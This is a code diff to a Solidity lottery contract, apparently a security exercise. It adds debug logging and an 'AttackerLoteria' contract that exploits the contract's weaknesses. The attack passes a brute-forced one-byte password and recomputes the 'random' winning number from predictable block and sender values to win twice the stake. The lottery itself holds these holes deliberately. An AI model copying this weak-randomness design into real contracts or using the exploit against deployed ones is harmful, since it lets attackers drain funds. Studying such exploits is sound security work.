@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.24;
-
+import "hardhat/console.sol";
 /**
  * El contrato LoteriaConPassword permite que las personas participen en una lotería
  * Sin embargo, solo permite participar a aquellas personas que "conocen" el password
@@ -45,7 +45,7 @@ contract LoteriaConPassword {
             uint256(keccak256(abi.encodePacked(password))) == FACTOR,
             "No es el hash correcto"
         );
-
+        console.log(msg.sender);
         uint256 numRandom = uint256(
             keccak256(
                 abi.encodePacked(
@@ -59,7 +59,8 @@ contract LoteriaConPassword {
         );
 
         uint256 numeroGanador = numRandom % 10;
-
+        console.log(_numeroGanador);
+        console.log(numeroGanador);
         if (numeroGanador == _numeroGanador) {
             payable(msg.sender).transfer(msg.value * 2);
         }
@@ -67,5 +68,35 @@ contract LoteriaConPassword {
 }
 
 contract AttackerLoteria {
-    function attack(address _sc) public payable {}
+
+    receive () external payable {}
+
+    function attack(address _loteriaAddress) public payable {
+
+        LoteriaConPassword loteria = LoteriaConPassword(_loteriaAddress);
+
+        
+        uint8 password = 202; // relice un force en python con un for de (i=0, i<255,i++)
+         uint256 numRandom = uint256(
+            keccak256(
+                abi.encodePacked(
+                    uint256(keccak256(abi.encodePacked(password))),
+                    uint256(1500), 
+                    tx.origin, 
+                    block.timestamp, 
+                    address(this)
+                )
+            )
+        );
+        
+        console.log(msg.sender);
+        console.log(address(this));
+        uint256 numeroGanador = numRandom % 10;
+
+        // Llama a la función participarEnLoteria con los parámetros correctos
+        loteria.participarEnLoteria{value: 1500}(password, numeroGanador);
+    
+    }
 }
+
+
